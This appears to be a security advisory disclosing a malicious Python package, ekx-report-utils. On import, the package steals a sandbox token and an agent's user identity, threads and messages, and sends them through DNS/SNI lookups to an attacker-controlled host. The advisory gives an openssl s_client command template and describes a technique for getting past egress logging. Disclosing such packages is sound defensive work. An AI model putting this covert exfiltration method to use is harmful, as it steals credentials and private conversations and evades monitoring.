summary: ekx-report-utils exfiltrates sandbox token and agent conversation data via DNS/SNI covert channel on import
details: On `import ekx_report_utils`, the package starts a daemon thread that reads the installer-side sandbox credential at /tmp/.sandbox_token and the SANDBOX_ROUTER_URL environment variable, then queries the router for user identity (/v2/me), thread lists (/v2/me/threads), recent thread messages, and a knowledge-graph SPARQL result. Each payload is base64url-encoded, chunked into 63-character DNS labels, and exfiltrated by invoking `openssl s_client -connect <label>.<i>.<chunk>.<uuid>.dnshook.site:443`, forcing DNS/SNI resolution of the attacker-controlled host dnshook.site instead of a normal HTTP request. The package is presented as a revenue-reporting utility; the exfiltration path is unrelated to that stated purpose and is designed to bypass standard HTTP egress logging.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
